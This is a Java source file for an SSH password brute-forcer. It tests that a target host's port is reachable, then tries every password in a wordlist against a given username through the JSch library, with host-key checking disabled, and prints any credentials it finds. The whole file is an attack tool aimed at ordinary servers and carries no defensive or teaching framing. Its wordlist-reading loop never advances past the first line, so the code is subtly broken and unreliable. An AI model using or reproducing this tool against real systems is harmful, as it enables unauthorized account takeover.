import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.io.FileReader;
import java.io.BufferedReader;
import com.jcraft.jsch.*;
//import sun.net.www.content.text.plain;

public class sshCracker{
    public static void main(String[] args){
        if(args.length != 3){
            System.out.println("usage: ./sshbrute.jar [TARGET[:PORT]] [USERNAME] [WORDLIST]");
            System.exit(1);
        }
        String targetIP;
        int targetPort;
        if (args[0].contains(":")){
            targetIP = args[0].split(":")[0];
            targetPort = Integer.parseInt(args[0].split(":")[1]);
        }else{
            targetIP = args[0];
            targetPort = 22;
        }

        checkHost(targetIP, targetPort);
        String user = args[1];
        ArrayList<String> wordList = getWordList(args[2]);
        System.out.println(String.format("cracking SSH psswd for \"%s\" at %s...\n", user, targetIP));
        for(int i=0; i < wordList.size(); i++){
           if(crackPass(targetIP, user, wordList.get(i), targetPort)){
            System.out.println("credentials found");
            System.out.println(String.format("\tuser: %s", user));
            System.out.println(String.format("\tpass: %s", wordList.get(i)));
            System.exit(0);
        }
        System.out.println("attempt failed");
        }
    }
    // This function opens a socket and attempts to connect to a port, 
    // given as an argument (this connection attempt does have a timeout set).
    public static void checkHost(String host, int port){
        try {
            System.out.println("checking host...");
            Socket checkSock = new Socket();
            checkSock.connect(new InetSocketAddress(host, port), 1000);
            checkSock.close();
            System.out.println("success");
        } catch (Exception e) {
            System.out.println("fail...");
            System.exit(1);
        }
    }
    public static ArrayList<String> getWordList(String path){
        System.out.println("reading wordlist...");
        ArrayList<String> wordList = new ArrayList<String>();

         try {
             BufferedReader reader = new BufferedReader(new FileReader(path));
             String line = reader.readLine();
             while(line != null){
                wordList.add(line);
             }
             reader.close();
             System.out.println("done");
         } catch (Exception e) {
             System.out.println("fail");
             System.exit(1);
         }
         return wordList;
    }

    public static boolean crackPass(String host, String user, String pass, int port){
        try {
            Session tryPass = new JSch().getSession(user, host, port);
            tryPass.setPassword(pass);
            tryPass.setConfig("StrictHostKeyChecking", "no");
            tryPass.connect(30000);
            tryPass.disconnect();
        } catch (Exception e) {
            return false;
        }
        return true;
    }
}